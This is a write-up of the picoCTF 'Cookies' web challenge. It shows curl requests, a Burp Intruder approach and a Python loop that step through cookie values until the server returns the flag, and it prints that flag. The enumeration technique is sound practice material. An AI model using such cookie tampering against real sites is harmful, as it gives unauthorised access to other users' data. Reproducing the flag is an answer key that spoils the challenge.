# picoCTF Cookies

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:17781/


after checking out the site, I see that after entering a cookie name the weppapp changes your browser's cookie value based on output. I can see this using curl from the origional request of a known existing cookie, the snickerdoodle:

```bash
└─$ curl 'http://mercury.picoctf.net:17781/check' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://mercury.picoctf.net:17781/' -H 'Connection: keep-alive' -H 'Cookie: name=0' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'|grep '<strong>Title</strong>'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1779  100  1779    0     0  22361      0 --:--:-- --:--:-- --:--:-- 22518
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
                                                                                            
```

increasing the browser-cookie value by one I can change what cookie I am seeing on the site:

```bash
curl 'http://mercury.picoctf.net:17781/check' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://mercury.picoctf.net:17781/' -H 'Connection: keep-alive' -H 'Cookie: name=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'|grep '<p style="text-align:center; font-size:30px;"><b>'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0  25578      0 --:--:-- --:--:-- --:--:-- 25797
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>

```


Seeing what is going on I am able to make a burp intruder attack that changes the cookie value, then reviewing the response length, one stands out over the rest, and it also happens to be the flag:

![image](https://user-images.githubusercontent.com/83407557/148654389-12679aba-6b7b-42d1-a77a-58fe3c3895dc.png)


## Python

Still trying to get my python to work on this one, it crashes due to a redirect issue, however using grep on the output, it does actually solve this lab before crashing. Still something to work on in the future.

```python
#!/usr/bin/env python3

import requests
import re

count = 0
while (count < 100):   
    count = count + 1
    cookies = {
    'name': str(count)
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Referer': 'http://mercury.picoctf.net:17781/',
	'Connection': 'keep-alive',
	'Upgrade-Insecure-Requests': '1',
	'Cache-Control': 'max-age=0',
    }
    res = requests.get('http://mercury.picoctf.net:17781/check', headers=headers, cookies=cookies)
    response_cookie = re.search('picoCTF{', res.text)
    print(response_cookie, res.text)
```

Then running it in bash I can grep for the flag....not perfect...

```bash
─$ python3 test.py|grep picoCTF                                                                               1 ⨯
<re.Match object; span=(1005, 1013), match='picoCTF{'> <!DOCTYPE html>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>

```
